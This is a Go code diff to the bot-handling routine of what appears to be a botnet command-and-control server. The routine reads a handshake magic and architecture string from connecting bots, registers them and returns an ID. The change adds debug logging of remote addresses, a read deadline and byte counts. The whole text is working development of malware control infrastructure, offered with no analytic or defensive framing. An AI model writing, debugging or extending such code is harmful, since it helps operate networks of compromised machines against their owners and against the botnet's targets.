@@ -29,57 +29,68 @@ const (
 
 func handleBot(conn net.Conn, reader *bufio.Reader) {
 	defer conn.Close()
+	remote := conn.RemoteAddr().String()
+
+	log.Printf("[debug] handleBot started from %s", remote)
 
 	// --- read full handshake ---
 	// We already peeked 1 byte (the leading 0x00), so read 3 more for the magic.
 	magicBytes := make([]byte, 4)
-	magicBytes[0] = 0x00 // we already know this
+	magicBytes[0] = 0x00
+
+	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 	_, err := io.ReadFull(reader, magicBytes[1:])
 	if err != nil {
-		log.Printf("[!] bot handshake read (magic): %v", err)
+		log.Printf("[!] bot handshake read (magic) from %s: %v", remote, err)
 		return
 	}
+	log.Printf("[debug] magic read OK from %s: %x", remote, magicBytes)
 
 	magic := binary.BigEndian.Uint32(magicBytes)
 	if magic != BotHandshakeMagic {
-		log.Printf("[!] bot sent bad magic: 0x%08x", magic)
+		log.Printf("[!] bot sent bad magic: 0x%08x from %s", magic, remote)
 		return
 	}
 
 	// --- read architecture string ---
 	archLenBytes := make([]byte, 2)
 	if _, err := io.ReadFull(reader, archLenBytes); err != nil {
-		log.Printf("[!] bot handshake read (arch_len): %v", err)
+		log.Printf("[!] bot handshake read (arch_len) from %s: %v", remote, err)
 		return
 	}
 	archLen := binary.BigEndian.Uint16(archLenBytes)
 	if archLen > 64 {
-		log.Printf("[!] bot arch string too long: %d", archLen)
+		log.Printf("[!] bot arch string too long: %d from %s", archLen, remote)
 		return
 	}
+	log.Printf("[debug] arch_len=%d from %s", archLen, remote)
 
 	archBytes := make([]byte, archLen)
 	if _, err := io.ReadFull(reader, archBytes); err != nil {
-		log.Printf("[!] bot handshake read (arch): %v", err)
+		log.Printf("[!] bot handshake read (arch) from %s: %v", remote, err)
 		return
 	}
 	arch := string(archBytes)
+	log.Printf("[debug] arch=%s from %s", arch, remote)
 
 	// --- register bot ---
-	bot := mgr.Register(conn, arch, 1) // version 1
+	bot := mgr.Register(conn, arch, 1)
 	if bot == nil {
-		log.Printf("[!] manager rejected bot registration")
+		log.Printf("[!] manager rejected bot registration from %s", remote)
 		return
 	}
+	log.Printf("[debug] bot assigned ID #%d", bot.ID)
 
 	// --- send assigned ID ---
 	idBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(idBytes, bot.ID)
-	if _, err := conn.Write(idBytes); err != nil {
-		log.Printf("[!] failed to send bot ID to #%d: %v", bot.ID, err)
+	n, err := conn.Write(idBytes)
+	if err != nil {
+		log.Printf("[!] failed to send bot ID to #%d: %v (wrote %d)", bot.ID, err, n)
 		mgr.Unregister(bot.ID)
 		return
 	}
+	log.Printf("[debug] sent bot ID #%d (%d bytes) to %s", bot.ID, n, remote)
 
 	log.Printf("[+] bot #%d registered  arch=%s  ip=%s", bot.ID, arch, bot.RemoteIP)
 
